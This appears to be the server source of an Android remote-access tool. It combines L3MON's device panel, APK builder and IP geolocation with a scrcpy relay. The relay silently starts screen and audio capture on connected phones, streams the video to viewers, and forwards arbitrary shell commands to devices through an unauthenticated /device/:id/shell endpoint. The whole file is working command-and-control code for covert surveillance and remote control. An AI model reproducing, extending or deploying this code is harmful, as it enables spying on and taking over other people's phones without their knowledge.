const express = require('express')
const http = require('http')
const https = require('https')
const path = require('path')
const { WebSocketServer } = require('ws')
const { spawn } = require('child_process')
const fs = require('fs')

// L3MON Imports
const IO = require('socket.io')
const geoip = require('geoip-lite')
const CONST = require('./includes/const')
const db = require('./includes/databaseGateway')
const logManager = require('./includes/logManager')
// Initialize clientManager with db (it expects db as arg)
const ClientManagerClass = require('./includes/clientManager')
const clientManager = new ClientManagerClass(db)
const apkBuilder = require('./includes/apkBuilder')

const app = express()

// L3MON Globals
global.CONST = CONST
global.db = db
global.logManager = logManager
global.app = app
global.clientManager = clientManager
global.apkBuilder = apkBuilder

const SSL_KEY_PATH = process.env.SSL_KEY_PATH || ''
const SSL_CERT_PATH = process.env.SSL_CERT_PATH || ''
let server
if (SSL_KEY_PATH && SSL_CERT_PATH) {
  let key = null, cert = null
  try { key = fs.readFileSync(SSL_KEY_PATH) } catch (e) {}
  try { cert = fs.readFileSync(SSL_CERT_PATH) } catch (e) {}
  server = (key && cert) ? https.createServer({ key, cert }, app) : http.createServer(app)
} else {
  server = http.createServer(app)
}

// L3MON Socket.IO
let client_io = IO(server, { pingInterval: 30000 })
client_io.on('connection', (socket) => {
    socket.emit('welcome');
    let clientParams = socket.handshake.query;
    let clientAddress = socket.request.connection;

    let clientIP = clientAddress.remoteAddress.substring(clientAddress.remoteAddress.lastIndexOf(':') + 1);
    let clientGeo = geoip.lookup(clientIP);
    if (!clientGeo) clientGeo = {}

    clientManager.clientConnect(socket, clientParams.id, {
        clientIP,
        clientGeo,
        device: {
            model: clientParams.model,
            manufacture: clientParams.manf,
            version: clientParams.release
        }
    });

    if (CONST.debug) {
        var onevent = socket.onevent;
        socket.onevent = function (packet) {
            var args = packet.data || [];
            onevent.call(this, packet);    // original call
            packet.data = ["*"].concat(args);
            onevent.call(this, packet);      // additional call to catch-all
        };

        socket.on("*", function (event, data) {
            console.log(event);
            console.log(data);
        });
    }
});

const wss = new WebSocketServer({ server, path: '/ws' })

app.set('view engine', 'ejs')
app.set('views', path.join(__dirname, 'views'))
app.use(express.json())
app.use(express.urlencoded({ extended: true }))
app.use(express.static(path.join(__dirname, 'public')))

// L3MON Static & Routes
app.use('/l3mon', express.static(path.join(__dirname, 'public/l3mon')))
app.use('/l3mon', require('./includes/expressRoutes'))

app.get('/favicon.ico', (req, res) => res.status(204).end())

const devices = new Map()

app.get('/', (req, res) => {
  res.render('index', { devices: Array.from(devices.keys()) })
})

app.get('/devices', (req, res) => {
  res.json({ devices: Array.from(devices.keys()) })
})

app.post('/device/:id/start', (req, res) => {
  const id = req.params.id
  const d = devices.get(id)
  if (!d) return res.status(404).json({ error: 'not found' })
  const body = req.body || {}
  const msg = JSON.stringify({ cmd: 'start', bitrate: body.bitrate || 3500000, maxSize: body.maxSize || 720, maxFps: body.maxFps || 60, audio: !!body.audio, command: `cp /data/data/com.sam.deamon_apk/files/scrcpy-server-v3.3.3 /data/local/tmp/scrcpy-server-v3.3.3 && chmod 755 /data/local/tmp/scrcpy-server-v3.3.3 && CLASSPATH=/data/local/tmp/scrcpy-server-v3.3.3 setsid /system/bin/app_process64 / com.genymobile.scrcpy.Server 3.3.3 video_bit_rate=${body.bitrate || 3500000} max_size=${body.maxSize || 720} max_fps=${body.maxFps || 60} raw_stream=true send_device_meta=false send_frame_meta=false send_dummy_byte=false send_codec_meta=false scid=00000000 audio=${!!body.audio} clipboard_autosync=false` })
  try { d.ws.send(msg) } catch (e) {}
  res.json({ ok: true })
})

app.post('/device/:id/stop', (req, res) => {
  const id = req.params.id
  const d = devices.get(id)
  if (!d) return res.status(404).json({ error: 'not found' })
  try { d.ws.send(JSON.stringify({ cmd: 'stop' })) } catch (e) {}
  res.json({ ok: true })
})

app.post('/device/:id/shell', (req, res) => {
  const id = req.params.id
  const d = devices.get(id)
  if (!d) return res.status(404).json({ error: 'not found' })
  const body = req.body || {}
  const command = typeof body.command === 'string' ? body.command : ''
  if (!command) return res.status(400).json({ error: 'invalid command' })
  try { d.ws.send(JSON.stringify({ type: 'shell', command })) } catch (e) {}
  res.json({ ok: true })
})

app.post('/start', (req, res) => {
  const body = req.body || {}
  const msg = JSON.stringify({ cmd: 'start', bitrate: body.bitrate || 3500000, maxSize: body.maxSize || 720, maxFps: body.maxFps || 60, audio: !!body.audio, command: `cp /data/data/com.sam.deamon_apk/files/scrcpy-server-v3.3.3 /data/local/tmp/scrcpy-server-v3.3.3 && chmod 755 /data/local/tmp/scrcpy-server-v3.3.3 && CLASSPATH=/data/local/tmp/scrcpy-server-v3.3.3 setsid /system/bin/app_process64 / com.genymobile.scrcpy.Server 3.3.3 video_bit_rate=${body.bitrate || 3500000} max_size=${body.maxSize || 720} max_fps=${body.maxFps || 60} raw_stream=true send_device_meta=false send_frame_meta=false send_dummy_byte=false send_codec_meta=false scid=00000000 audio=${!!body.audio} clipboard_autosync=false` })
  for (const [, d] of devices) { try { d.ws.send(msg) } catch (e) {} }
  res.json({ ok: true })
})

app.post('/stop', (req, res) => {
  for (const [, d] of devices) { try { d.ws.send(JSON.stringify({ cmd: 'stop' })) } catch (e) {} }
  res.json({ ok: true })
})

app.get('/view/:id', (req, res) => {
  const id = req.params.id
  res.render('viewer', { id })
})

app.get('/view-webcodecs/:id', (req, res) => {
  const id = req.params.id
  res.render('webcodecs_viewer', { id })
})

wss.on('connection', (ws) => {
  let role = null
  let id = null

  ws.on('message', (data, isBinary) => {
    if (!role) {
      try {
        const msg = JSON.parse(data.toString())
        if (msg.type === 'device' && msg.id) {
          role = 'device'
          id = msg.id
          const viewers = new Set()
          const mux = createMux(id)
          const initialPipeline = (mux && mux.enabled) ? 'fmp4' : 'annexb'
          devices.set(id, { ws, viewers, viewerInitVersion: new Map(), mux, jpg: null, pipeline: initialPipeline, counters: { videoBytes:0, videoPkts:0, controlBytes:0, controlPkts:0 } })
          try { console.log('device connect', id, 'mux', mux.enabled) } catch (e) {}
          return
        } else if (msg.type === 'viewer' && msg.id) {
          role = 'viewer'
          id = msg.id
          const d = devices.get(id)
          if (!d) return ws.close(1008, 'device not found')
          d.viewers.add(ws)
          d.viewerInitVersion.set(ws, d.mux.initVersion)
          try {
            const currentMode = d.pipeline || (d.mux && d.mux.enabled ? 'fmp4' : 'annexb')
            const modeMsg = JSON.stringify({ type:'mode', mode: currentMode })
            ws.send(modeMsg)
            try { console.log('viewer connect', id, 'mode', currentMode) } catch (e) {}
            
            // Immediately send init segment if available
            if (currentMode === 'fmp4' && d.mux.enabled && d.mux.init) {
                 safeSend(ws, d.mux.init, true)
                 d.viewerInitVersion.set(ws, d.mux.initVersion)
            }
          } catch (e) {}
          ws.on('close', () => d.viewers.delete(ws))
          return
        }
      } catch (e) {}
    } else if (role === 'viewer') {
      const d = devices.get(id)
      if (!d) return
      if (!isBinary) {
        try {
          const msg = JSON.parse(data.toString())
          if (msg && msg.type === 'mode' && msg.mode === 'fmp4') {
            try { if (d.jpg && d.jpg.enabled) d.jpg.close() } catch (e) {}
            if (!d.mux || !d.mux.enabled) {
              try { d.mux = createMux(id) } catch (e) { d.mux = { enabled:false, write(){}, close(){}, get init(){ return null }, get initVersion(){ return 0 } } }
            }
            if (d.mux && d.mux.enabled) {
              d.pipeline = 'fmp4'
              const modeMsg = JSON.stringify({ type:'mode', mode:'fmp4' })
              for (const v of d.viewers) safeSend(v, modeMsg, false)
              if (d.mux.init) {
                for (const v of d.viewers) { safeSend(v, d.mux.init, true); d.viewerInitVersion.set(v, d.mux.initVersion) }
              }
              try { console.log('mode switch to fmp4 for', id) } catch (e) {}
            } else {
              d.pipeline = 'annexb'
              const modeMsg = JSON.stringify({ type:'mode', mode:'annexb' })
              for (const v of d.viewers) safeSend(v, modeMsg, false)
              try { console.log('mux unavailable; fallback to annexb for', id) } catch (e) {}
            }
            return
          } else if (msg && msg.type === 'mode' && msg.mode === 'annexb') {
            d.pipeline = 'annexb'
            // notify viewers?
            const modeMsg = JSON.stringify({ type:'mode', mode:'annexb' })
            for (const v of d.viewers) safeSend(v, modeMsg, false)
            try { console.log('mode switch to annexb for', id) } catch (e) {}
            return
          } else if (msg && msg.type === 'request_init') {
          if (d.mux.enabled && d.mux.init) {
            safeSend(ws, d.mux.init, true)
            d.viewerInitVersion.set(ws, d.mux.initVersion)
            try { console.log('init resent to viewer', id) } catch (e) {}
            }
            return
          }
        } catch (e) {}
      }
      try { console.log('viewer control', id, Buffer.isBuffer(data) ? data.length : 0) } catch (e) {}
      safeSend(d.ws, data, isBinary)
    } else if (role === 'device') {
      if (!isBinary) {
        try {
          const msg = JSON.parse(data.toString())
          const d = devices.get(id)
          if (d && msg && msg.type === 'status') {
            try { console.log('apk status', id, msg.level || 'info', msg.msg || '') } catch (e) {}
            for (const v of d.viewers) {
              try { v.send(JSON.stringify(msg)) } catch (e) {}
            }
          }
        } catch (e) {}
        return
      }
      // demux: 1 byte channel + 4 byte length + payload
      const buf = (Buffer.isBuffer(data)) ? data : Buffer.from(data)
      if (buf.length < 5) return
      const channel = buf.readUInt8(0)
      const length = buf.readUInt32BE(1)
      if (5 + length > buf.length) return
      const payload = buf.slice(5, 5 + length)
      if (channel === 0) {
        const d = devices.get(id)
        if (!d) return
        d.counters.videoPkts++
        d.counters.videoBytes += payload.length
        if (d.counters.videoPkts % 100 === 0) { try { console.log('video payload', id, payload.length, 'total pkts', d.counters.videoPkts) } catch (e) {} }
        if (d.counters.videoPkts === 1) { try { console.log('first video payload', id, payload.length) } catch (e) {} }
        if (d.pipeline === 'fmp4' && d.mux.enabled) {
          d.mux.write(payload, (seg) => {
            for (const v of d.viewers) {
              const seen = d.viewerInitVersion.get(v)
              if (seen !== d.mux.initVersion && d.mux.init) {
                safeSend(v, d.mux.init, true)
                d.viewerInitVersion.set(v, d.mux.initVersion)
              }
              safeSend(v, seg, true)
            }
          })
        } else if (d.pipeline === 'annexb') {
          for (const v of d.viewers) safeSend(v, payload, true)
        } else if (d.pipeline === 'mjpeg' && d.jpg && d.jpg.enabled) {
          d.jpg.write(payload, (frame) => {
            for (const v of d.viewers) safeSend(v, frame, true)
          })
        }
      } else if (channel === 1) {
        const d = devices.get(id)
        if (!d) return
        d.counters.controlPkts++
        d.counters.controlBytes += payload.length
        // do not forward control payloads to viewers
      }
    }
  })

  ws.on('close', () => {
    if (role === 'device' && id) {
      const d = devices.get(id)
      if (d) {
        for (const v of d.viewers) try { v.close() } catch (e) {}
        try { d.mux.close() } catch (e) {}
      }
      devices.delete(id)
    }
  })
})

function safeSend(ws, data, isBinary = true) {
  try {
    if (ws.readyState === 1) { // OPEN
      if (ws.bufferedAmount > 512 * 1024) { // Drop if > 512KB buffered
         // Optionally log drop
         return
      }
      ws.send(data, { binary: isBinary })
    }
  } catch (e) {}
}

function findLocalFfmpeg(){
  const base = path.join(__dirname, 'bin')
  const target = process.platform === 'win32' ? 'ffmpeg.exe' : 'ffmpeg'
  try {
    const stack = [base]
    while (stack.length) {
      const dir = stack.pop()
      let entries
      try { entries = fs.readdirSync(dir, { withFileTypes: true }) } catch (e) { continue }
      for (const e of entries) {
        const p = path.join(dir, e.name)
        if (e.isDirectory()) stack.push(p)
        else if (e.isFile() && e.name.toLowerCase() === target) return p
      }
    }
  } catch (e) {}
  return null
}

function createMux(id) {
  const transcode = ((process.env.TRANSCODE || 'false') + '').toLowerCase() === 'true'
  const scale = process.env.TRANSCODE_SCALE ? parseInt(process.env.TRANSCODE_SCALE,10) : 720
  const fps = process.env.TRANSCODE_FPS ? parseInt(process.env.TRANSCODE_FPS,10) : 60
  const bitrate = process.env.TRANSCODE_BITRATE ? (process.env.TRANSCODE_BITRATE+'') : '3500k'
  const args = transcode ? [
    '-loglevel','error',
    '-fflags','+nobuffer+genpts',
    '-use_wallclock_as_timestamps','1',
    '-flush_packets','1',
    '-max_interleave_delta','0',
    '-f','h264','-i','pipe:0',
    '-vf',`scale=-2:${scale},fps=${fps}`,
    '-c:v','libx264',
    '-b:v',bitrate,
    '-maxrate',bitrate,
    '-bufsize', '1600k',
    '-preset','veryfast',
    '-tune','zerolatency',
    '-pix_fmt','yuv420p',
    '-x264-params','keyint=30:min-keyint=30:scenecut=0',
    '-muxdelay','0','-muxpreload','0',
    '-movflags','empty_moov+default_base_moof+frag_keyframe',
    '-f','mp4','pipe:1'
  ] : [
    '-loglevel','error',
    '-fflags','+nobuffer+genpts',
    '-use_wallclock_as_timestamps','1',
    '-flush_packets','1',
    '-f','h264','-i','pipe:0',
    '-c','copy',
    '-muxdelay','0','-muxpreload','0',
    '-movflags','empty_moov+default_base_moof+frag_keyframe',
    '-f','mp4','pipe:1'
  ]
  let proc
  try {
    const local = findLocalFfmpeg()
    const cmd = local || 'ffmpeg'
    proc = spawn(cmd, args, { stdio: ['pipe','pipe','ignore'] })
    try { console.log('ffmpeg spawn', cmd) } catch (e) {}
  } catch (e) {
    return { enabled: false, write(){}, close(){}, get init(){ return null } }
  }
  let init = null
  let initVersion = 0
  let pending = Buffer.alloc(0)
  let lastMoof = null
  let segCallback = null
  let enabled = true
  proc.on('error', () => { enabled = false })
  proc.stdout.on('data', (chunk) => {
    pending = Buffer.concat([pending, chunk])
    let offset = 0
    while (offset + 8 <= pending.length) {
      const size = pending.readUInt32BE(offset)
      const type = pending.toString('ascii', offset+4, offset+8)
      if (size < 8 || offset + size > pending.length) break
      const box = pending.slice(offset, offset + size)
      if (!init) {
        if (type === 'ftyp') {
          lastMoof = null
        }
        if (type === 'moov') {
          init = Buffer.concat([findBox(pending,'ftyp') || Buffer.alloc(0), box])
          initVersion++
          try { console.log('mux init ready', id, init.length) } catch (e) {}
        }
      } else if (type === 'moov') {
        init = Buffer.concat([findBox(pending,'ftyp') || Buffer.alloc(0), box])
        initVersion++
        try { console.log('mux init refresh', id, init.length) } catch (e) {}
      } else {
        if (type === 'moof') {
          lastMoof = box
        } else if (type === 'mdat' && lastMoof) {
          const seg = Buffer.concat([lastMoof, box])
          if (segCallback) segCallback(seg)
          lastMoof = null
        }
      }
      offset += size
    }
    pending = pending.slice(offset)
  })
  function write(data, onSegment) {
    segCallback = onSegment
    if (!enabled) return
    // try { console.log('mux write', data.length) } catch(e) {}
    try { proc.stdin.write(data) } catch (e) {}
  }
  function close() {
    try { proc.stdin.end() } catch (e) {}
    try { proc.kill() } catch (e) {}
    enabled = false
  }
  function findBox(buf, name) {
    let off = 0
    while (off + 8 <= buf.length) {
      const size = buf.readUInt32BE(off)
      const type = buf.toString('ascii', off+4, off+8)
      if (size < 8 || off + size > buf.length) break
      if (type === name) return buf.slice(off, off+size)
      off += size
    }
    return null
  }
  return { get enabled() { return enabled }, write, close, get init() { return init }, get initVersion() { return initVersion } }
}

function createJpegTranscoder(id) {
  const args = ['-loglevel','error','-fflags','+nobuffer','-f','h264','-i','pipe:0','-f','image2pipe','-vcodec','mjpeg','-q:v','5','pipe:1']
  let proc
  let cmdPath = null
  try {
    const local = findLocalFfmpeg()
    const cmd = local || 'ffmpeg'
    cmdPath = cmd
    proc = spawn(cmd, args, { stdio: ['pipe','pipe','ignore'] })
    try { console.log('ffmpeg mjpeg spawn', cmd) } catch (e) {}
  } catch (e) {
    return { enabled: false, write(){}, close(){} }
  }
  let pending = Buffer.alloc(0)
  let segCallback = null
  let enabled = true
  proc.on('error', () => { enabled = false })
  proc.stdout.on('data', (chunk) => {
    // try { console.log('mjpeg stdout chunk', chunk.length) } catch(e) {}
    pending = Buffer.concat([pending, chunk])
    // Find JPEG frames: SOI 0xFFD8 ... EOI 0xFFD9
    let start = indexOfMarker(pending, 0xFFD8, 0)
    while (start >= 0) {
      const end = indexOfMarker(pending, 0xFFD9, start + 2)
      if (end < 0) break
      const frame = pending.slice(start, end + 2)
      if (segCallback) segCallback(frame)
      pending = pending.slice(end + 2)
      start = indexOfMarker(pending, 0xFFD8, 0)
    }
  })
  function write(data, onFrame) {
    segCallback = onFrame
    if (!enabled) return
    try { proc.stdin.write(data) } catch (e) {}
  }
  function close() {
    try { proc.stdin.end() } catch (e) {}
    try { proc.kill() } catch (e) {}
    enabled = false
  }
  function indexOfMarker(buf, marker, from) {
    // marker is 0xFFD8 or 0xFFD9
    for (let i = from; i + 1 < buf.length; i++) {
      if (buf[i] === 0xFF && buf[i+1] === (marker & 0xFF)) return i
    }
    return -1
  }
  return { get enabled() { return enabled }, write, close, get path() { return cmdPath } }
}

function disableMuxForDevice(id) {
  const d = devices.get(id)
  if (!d) return
  try { d.mux.close() } catch (e) {}
  d.mux = { enabled: false, write(){}, close(){}, get init(){ return null }, get initVersion(){ return 0 } }
}

const PORT = parseInt(process.env.PORT || '22533', 10)
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running at http://localhost:${PORT}/`)
})

app.get('/debug', (req, res) => {
  const out = {}
  for (const [id, d] of devices) {
    out[id] = { viewers: d.viewers.size, counters: d.counters, pipeline: d.pipeline || (d.mux && d.mux.enabled ? 'fmp4' : 'annexb'), jpg: d.jpg ? { enabled: d.jpg.enabled, path: d.jpg.path || null } : null }
  }
  res.json(out)
})
